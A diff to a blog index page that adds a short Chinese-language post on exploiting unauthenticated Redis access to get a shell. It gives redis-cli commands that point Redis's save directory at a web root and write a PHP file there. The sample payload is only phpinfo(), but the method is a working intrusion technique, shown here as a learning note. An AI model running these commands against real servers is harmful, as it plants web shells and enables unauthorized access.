@@ -155,6 +155,83 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-redis" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/25/redis/">redis 未授权访问漏洞 getshell</a>
+    </h1>
+  
+
+        
+        <a href="/2019/03/25/redis/" class="archive-article-date">
+  	<time datetime="2019-03-25T05:32:39.745Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="redis-未授权访问漏洞-getshell"><a href="#redis-未授权访问漏洞-getshell" class="headerlink" title="redis 未授权访问漏洞 getshell"></a>redis 未授权访问漏洞 getshell</h2><p>这里记录一下redis未授权访问漏洞的getshell，方便日后回顾</p>
+<p>redis是一个key-value型数据库，信息以键对应值的关系存储在内存中。6379是redis的默认端口。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>下载redis，修改redis配置文件redis.conf中的几个地方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库,也可以改成 bind 0.0.0.0</span><br><span class="line">2.protected-mode要修改为no，否则远程连接数据库的ip执行不了数据库语句</span><br></pre></td></tr></table></figure>
+<p>启动redis服务器(当前redis的文件夹)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure></p>
+<p>攻击者:(可以自己虚拟机搭建)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h xxx目标ip -p 6379</span><br></pre></td></tr></table></figure></p>
+<p>或者不用redis，可用telnet等连接命令</p>
+<p>redis配置的几个关键：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir 指定的是redis的“工作路径”，之后生成的RDB和AOF文件都会存储在这里。</span><br><span class="line">dbfilename RDB文件名，默认为“dump.rdb”</span><br><span class="line">appendonly 是否开启AOF</span><br><span class="line">appendfilename AOF文件名，默认为“appendonly.aof”</span><br><span class="line">appendfsync AOF备份方式：always、everysec、no</span><br></pre></td></tr></table></figure>
+<h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p>条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）redis服务器上有web服务器</span><br><span class="line">（2）web根目录已知</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/   //目标的网站根目录</span><br><span class="line">config set dbfilename shell.php     //修改备份RDB文件名为shell.php</span><br><span class="line">set aaa &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>任意set一个变量aaa的值为”&lt;?php phpinfo(); ?&gt;”,即可对目标服务器getshell</p>
+<p>参考链接：<br>离别歌 <a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</a></p>
+<p>知乎<br><a href="https://zhuanlan.zhihu.com/p/36529010" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/36529010</a> </p>
+<p>csdn<br><a href="https://blog.csdn.net/u011721501/article/details/45157399" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/45157399</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/03/25/redis/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-google hack" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
